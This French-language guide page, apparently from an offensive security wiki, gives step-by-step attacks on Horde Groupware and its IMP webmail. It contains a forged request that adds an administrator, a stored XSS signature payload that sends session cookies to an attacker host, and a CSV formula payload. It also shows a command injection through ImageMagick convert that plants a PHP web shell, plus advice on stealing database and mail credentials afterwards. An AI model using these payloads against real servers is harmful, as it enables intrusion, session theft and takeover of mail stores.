---
title: "Horde : CSRF contre l'admin, injection de préférences et injection de commandes via le gestionnaire d'images"
order: 2
description: "Attaquer le Horde Groupware et son webmail IMP : identification de /horde/, falsification de requête intersite qui ajoute un administrateur ou réécrit les préférences, injection via les sous-systèmes Turba et préférences, et l'injection de commandes Horde_Image via convert qui atteint l'exécution de code sur le serveur."
keywords:
  - horde webmail
  - horde csrf
  - horde_image command injection
  - horde imp
  - preference injection
---

# Horde

Horde est un framework de groupware en PHP ; son module de webmail est **IMP**, avec les contacts dans **Turba** et des bibliothèques partagées comme `Horde_Form`, `Horde_Prefs` et `Horde_Image`. Deux formes d'attaque dominent. Premièrement, les points de terminaison qui modifient l'état (administration, préférences) ont régulièrement manqué de jetons anti-CSRF ou accepté des requêtes forgeables, de sorte qu'un utilisateur connecté visitant un contenu de l'attaquant, ou ouvrant un message forgé, change silencieusement l'état du serveur. Deuxièmement, les assistants d'images et de formulaires de Horde invoquent des binaires externes (`convert` d'ImageMagick) et construisent des lignes de commande à partir de valeurs influencées par l'attaquant, transformant une fonctionnalité de webmail en exécution de commandes.

## Identifier d'abord

```bash
curl -sk https://<target>/horde/ -i | grep -iE 'set-cookie|generator|location'
#   Set-Cookie: Horde=...                    confirms Horde
curl -sk https://<target>/horde/login.php -i | grep -i generator
curl -sk https://<target>/horde/services/help/ -i        # services tree presence
```

Le cookie `Horde`, la racine `/horde/`, et une balise `<meta name="generator" content="Horde ...">` identifient le produit ; la balise generator et les chemins d'assets JS sous `/horde/js/` cernent les versions du framework et d'IMP, qui sélectionnent les chemins d'injection et d'injection de commandes actifs.

## CSRF vers administrateur

L'administration de Horde (`/horde/admin/`) gère les utilisateurs, la configuration et l'appartenance aux groupes. Lorsqu'une action d'admin est pilotée par un simple GET/POST sans jeton par requête, une requête forgée depuis le navigateur de l'admin s'exécute avec la session de l'admin. La cible classique est l'ajout d'un administrateur ou la réécriture des préférences d'un utilisateur afin que votre compte hérite de privilèges.

```http
POST /horde/admin/user.php HTTP/1.1
Host: target
Cookie: Horde=<victim-admin-session>
Content-Type: application/x-www-form-urlencoded

actionID=adduser&user_name=attacker&user_pass=Passw0rd!&user_pass2=Passw0rd!
```

Délivrée sous forme de formulaire à soumission automatique sur une page que l'admin visite (ou intégrée de sorte qu'elle se déclenche quand un administrateur lit votre message dans IMP), la requête s'exécute dans le contexte de l'admin et provisionne le compte. Confirmez en vous authentifiant comme l'utilisateur implanté :

```http
POST /horde/login.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

horde_user=attacker&horde_pass=Passw0rd!&login_post=1
```

Un `Set-Cookie: Horde=...` avec une redirection de connexion réussie confirme que le provisionnement forgé a fonctionné.

## Injection de préférences et Turba

Horde stocke les préférences par utilisateur (`Horde_Prefs`) et les contacts (`Turba`) et en rend plusieurs dans du HTML ou dans des fichiers générés. Deux conséquences :

- **XSS stocké via un champ de préférence ou de contact.** Une préférence comme la signature, ou un champ de contact Turba, stockée sans encodage de sortie et rendue plus tard dans l'interface authentifiée, exécute du script dans la session de la victime quand elle la consulte, exactement comme le cas du rendu de message mais atteint via un champ enregistré plutôt qu'un corps d'e-mail.
- **Injection de formule CSV à l'export.** Les exports de contacts Turba construisent un CSV dont les valeurs de cellule proviennent des champs de contact. Un champ commençant par `=`, `+`, `-` ou `@` (par exemple `=cmd|'/c calc'!A1`) est interprété comme une formule quand la victime ouvre l'export dans un tableur, s'exécutant sur son poste de travail plutôt que sur le serveur. C'est le chemin `Text_Filter`/CSV.

```http
POST /horde/services/prefs.php HTTP/1.1
Host: target
Cookie: Horde=<session>
Content-Type: application/x-www-form-urlencoded

actionID=update_prefs&group=signature&signature=<img src=x onerror=fetch('//attacker/?'+document.cookie)>
```

Lorsque la victime ouvre ensuite le compositeur ou consulte sa signature, la charge utile stockée s'exécute dans l'origine `https://<target>/horde` et fait fuiter la session.

## Injection de commandes via le gestionnaire d'images vers RCE

`Horde_Image` rend et transforme les images (miniatures, CAPTCHA, graphiques de calendrier) en invoquant un binaire externe, typiquement le `convert` d'ImageMagick, avec une ligne de commande assemblée à partir de la configuration et de paramètres influencés par la requête. Lorsqu'une valeur de dimension, de contexte ou de nom de fichier parvient sans guillemets dans cette ligne de commande, des métacaractères shell s'en échappent et s'exécutent en tant qu'utilisateur web. Les déclencheurs atteignables incluent le contexte d'image traité sur certaines actions IMP/Kronolith.

```http
POST /horde/imp/ HTTP/1.1
Host: target
Cookie: Horde=<session>
Content-Type: application/x-www-form-urlencoded

actionID=...&context=thumbnail&ctx[...]=;id>/tmp/o;&...
```

Le `;id>/tmp/o;` injecté est exécuté quand Horde construit et exécute la ligne de commande `convert`. Confirmez et lisez la sortie via tout fichier que l'utilisateur web peut servir, ou redirigez dans la racine web :

```http
POST /horde/imp/ HTTP/1.1
Host: target
Cookie: Horde=<session>

...ctx[...]=;echo '<?php system($_GET[c]);?>'>/var/www/horde/sh.php;...
```

```http
GET /horde/sh.php?c=id HTTP/1.1
Host: target
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

La sortie `www-data` confirme l'exécution de commandes sur le serveur en tant qu'utilisateur web.

## Notes d'exploitation

- Les chemins CSRF et préférences nécessitent une **victime avec une session** (un admin pour le provisionnement, tout utilisateur pour le XSS) ; délivrez le déclencheur par e-mail pour qu'il se déclenche dans IMP, ou hébergez-le là où la cible le chargera.
- Le chemin `Horde_Image`/`convert` est un RCE **côté serveur** en tant qu'utilisateur web et nécessite généralement une session authentifiée pour atteindre l'action d'image ; enchaînez-le après un compte provisionné par CSRF ou obtenu par pulvérisation.
- Après exécution en tant qu'utilisateur web, lisez `/var/www/horde/config/conf.php` pour les identifiants de base de données et de back end IMAP/SMTP, transformant un compte en tout le magasin de courrier.
- ImageMagick lui-même ajoute une seconde voie : un délégué d'image forgé (l'abus du codeur `MSL`/`ephemeral`/`https`, « ImageTragick ») traité par le même appel `convert` atteint l'exécution de code même là où la ligne de commande est entre guillemets.

## Outils

- [horde/horde (source, pour localiser l'action vulnérable et l'assemblage de commande)](https://github.com/horde/horde)
- Burp Suite pour façonner le formulaire CSRF et le paramètre injecté.

## Références

- [Source et notes de version du projet Horde](https://github.com/horde)
- [Sécurité d'ImageMagick (abus de délégué / codeur)](https://imagemagick.org/script/security-policy.php)
- [OWASP : injection CSV](https://owasp.org/www-community/attacks/CSV_Injection)
